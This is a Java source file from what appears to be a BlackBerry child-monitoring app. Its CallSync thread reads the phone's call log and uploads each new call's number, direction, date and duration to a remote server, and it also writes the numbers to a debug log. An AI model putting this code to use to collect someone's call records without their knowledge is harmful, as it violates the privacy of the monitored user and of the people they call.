package com.kids.sync;

import net.rim.blackberry.api.phone.phonelogs.CallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLogID;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import com.kids.Logger;
import com.kids.Registration;
import com.kids.Data.Tools;
import com.kids.Monitor.CallMessage;
import com.kids.net.Reply;
import com.kids.net.Server;
import com.kids.prototypes.Debug;
import com.kids.prototypes.LocalDataReader;
import com.kids.prototypes.MMTools;

/**
 * Synchronises the call data to the server.
 */
public class CallSync extends Thread
{
	private boolean 			finishedSync;
	private Server 				server;
	//private ContentResolver 	resolver;
	//private LocalDataReader 	localData;
	private int 				type = 11;
	private Debug logger = Logger.getInstance();
	private MMTools tools = Tools.getInstance();

	//@SuppressWarnings("unused")
	//private CallSync(){	}
	
	/**
	 * Initialises ContentResolver LocalDataWriter Server
	 * @param _resolver
	 * @param _localData
	 * @param _server
	 */
	public CallSync(LocalDataReader _localData, Server _server)
	{
		logger.log("Starting CallSync");
		finishedSync = false;
		server 		 = _server;
		//resolver 	 = _resolver;
		//localData 	 = _localData;
	}
	
	/**
	 * Matches the device call time with the server call time. 
	 * If server time is less than device call time, it sends call messages to server
	 */
	public void run()
	{
		logger.log("Running CallSync");
		StringBuffer stringREST = new StringBuffer();
		stringREST.append(Registration.getRegID());
		stringREST.append(Tools.RestElementSeparator);
		stringREST.append(type);
		
		logger.log("CallSync::Contacting Server...");
		Reply serverReply = server.contactServer(stringREST.toString());
		long lastServerTime = Long.parseLong( serverReply.getInfo() );
		
		logger.log("Callsync calling code:"+serverReply.getCallingCode());
		
		//Get the list of calls in the call log
		PhoneLogs phoneLog = PhoneLogs.getInstance();
		//Store the number of regular calls, and missed calls
		int numCalls = phoneLog.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);

		logger.log("Number of calls in call log: "+numCalls);
		logger.log("Last call time on server: "+lastServerTime);
		
		//Check if the reply contained a valid server command
		if(tools.isNumber(serverReply.getCallingCode()) 
				&& Integer.parseInt(serverReply.getCallingCode()) == type)
		{
			logger.log("CallSync::Valid reply received");
			// Create object to store each calls details, one by one
			CallMessage callMessageHolder = new CallMessage(true);
			// Loop through call list
			logger.log("CallSync::Looping through call log...");
			for(int count=0 ; count<numCalls ; count++)
			{
				// Get the call log entry
				CallLog callLogEntry = phoneLog.callAt(count, PhoneLogs.FOLDER_NORMAL_CALLS);
				
				//Get the phone number from this Call Log entry
				PhoneCallLog callLog = (PhoneCallLog) phoneLog.callAt(count, PhoneLogs.FOLDER_NORMAL_CALLS);
				PhoneCallLogID phoneID = callLog.getParticipant();
				
				// Get the time when the call was made
				long callSystemTime = callLogEntry.getDate().getTime();
				
				
				// If there is a newer call in the log, than the last one the server has...
				if(lastServerTime < Long.parseLong(tools.getDate( callSystemTime ) ))
				{
					logger.log("CallSync::Found new call entry");
					logger.log("CALL lastServerTime:"+lastServerTime+" < "+callSystemTime+"callSystemTime");
					int StartCallState = callLogEntry.getStatus(); // <- is it inbound or outbound

					if(PhoneCallLog.TYPE_PLACED_CALL == StartCallState
					|| PhoneCallLog.TYPE_RECEIVED_CALL == StartCallState)
					{
						boolean outgoing = false;
						if(PhoneCallLog.TYPE_PLACED_CALL == StartCallState)
						{	outgoing = true;	}

						// Output data for DEBUG
						logger.log("Message> "+phoneID.getAddressBookFormattedNumber()
								  +" outgoing:"+outgoing
								  +" Date: "+tools.getDate(callSystemTime)
								  +" Duration: "+callLogEntry.getDuration()
								  );
						
						// Add data to object, and subsequently the database.
						callMessageHolder.setMessage(phoneID.getAddressBookFormattedNumber(),
													 outgoing,
													 tools.getDate(callSystemTime),
													 callLogEntry.getDuration()
													 );
					
						// Contact/Reply to server with the call log entry 
						server.contactServer(callMessageHolder);
					}
					callMessageHolder.clearData();//reset only when the loop is processing message
				}//end if check event VS server time
			} // end for()
		} //end if()
		else
		{
			logger.log("CallSync::No valid reply received");
		}
		logger.log("CallSync::Finished sync");
		finishedSync = true;
	}
	/**
	 * Return true if synchronisation is completed.
	 * @return true if synchronisation is completed, false otherwise.
	 */
	public boolean syncComplete()
	{
		return finishedSync;
	}
}